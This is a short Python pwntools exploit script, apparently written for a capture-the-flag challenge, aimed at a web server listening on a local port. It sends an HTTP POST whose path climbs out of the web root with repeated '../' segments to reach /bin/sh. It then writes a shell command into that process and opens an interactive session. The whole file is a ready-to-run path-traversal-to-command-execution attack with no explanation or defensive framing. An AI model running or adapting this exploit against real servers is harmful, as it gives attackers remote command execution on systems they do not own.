from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

io = remote('127.0.0.1', 37461)

def exp():
    cmd = "ls 1>&4\n"

    request = b'''POST /../../../../../../../../../../../../bin/sh HTTP/1.1
Host: localhost:8081
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Content-Length: 256 
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-HK,zh-CN;q=0.9,zh;q=0.8,en;q=0.7,en-US;q=0.6

'''.replace(b'\n', b'\r\n')
    io.send(request)
    io.send(cmd)

exp()

io.interactive()

